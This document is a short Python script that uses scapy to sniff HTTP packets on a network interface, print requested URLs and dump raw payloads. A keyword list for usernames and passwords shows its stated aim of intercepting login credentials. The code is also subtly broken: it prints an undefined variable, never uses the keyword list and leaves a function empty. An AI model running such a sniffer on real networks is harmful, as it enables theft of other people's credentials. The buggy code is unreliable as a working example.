'''
script intercepting packets, filtering for packets of interest and password/username extraction
'''

#import liraries and modules

import scapy.all as scapy
#from scapy.layers import http --> deprecated
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_processing) #prn - function to pass the sniffed packets to

def get_url(packet):
    pass

def packet_processing(packet):
    if packet.haslayer(http.HTTPRequest): #check if packet has an http-layer - NOTE: http is the only layer scapy.all does not provide --> additionally imported from scapy.layers
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] url \t {url}")
        #print(packet[http.HTTPRequest].show()) # use .show() or .summary() on packets, for troublshooting and to see output

        if packet.haslayer(scapy.Raw):
            data = packet[scapy.Raw].load
            keywords = ["uname", "username", "user", "login", "password", "pass", "pw"]
            print(load)

if __name__ == "__main__":
    try:
        while True:
            sniff("eth0")

    except KeyboardInterrupt:
        print("\n[+] Shutting down program... Please wait\n")
        exit()